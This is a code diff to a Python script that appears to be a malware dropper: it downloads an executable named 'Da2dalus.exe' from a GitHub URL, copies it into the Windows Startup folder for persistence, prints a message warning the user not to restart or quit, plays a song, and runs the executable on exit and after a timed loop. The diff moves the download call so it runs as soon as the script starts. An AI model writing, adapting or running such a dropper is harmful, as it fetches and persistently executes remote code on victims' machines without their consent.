@@ -4,6 +4,15 @@ import time
 import os
 import atexit
 
+def download_payload():
+    if not os.path.isfile("Da2dalus.exe"):
+        url = "https://github.com/Da2dalus/OneLastSong/blob/main/Da2dalus.exe?raw=true"
+        r = requests.get(url, allow_redirects=True)
+        open('Da2dalus.exe', 'wb').write(r.content)
+        os.system('XCOPY "Da2dalus.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"')
+
+download_payload()
+
 def exit_handler():
     os.system("Da2dalus.exe")
 
@@ -19,16 +28,10 @@ print("Don't even think about restarting your computer or quitting this program!
 
 winsound.PlaySound("ComeAndGetYourLove.mp3", winsound.SND_ASYNC | winsound.SND_ALIAS )
 
-def download_payload():
-    if not os.path.isfile("Da2dalus.exe"):
-        url = "https://github.com/Da2dalus/OneLastSong/blob/main/Da2dalus.exe?raw=true"
-        r = requests.get(url, allow_redirects=True)
-        open('Da2dalus.exe', 'wb').write(r.content)
-        os.system('XCOPY "Da2dalus.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"')
-
 end = time.time() + 195
 
 while time.time() < end:
     download_payload()
 
 os.system("Da2dalus.exe")
+
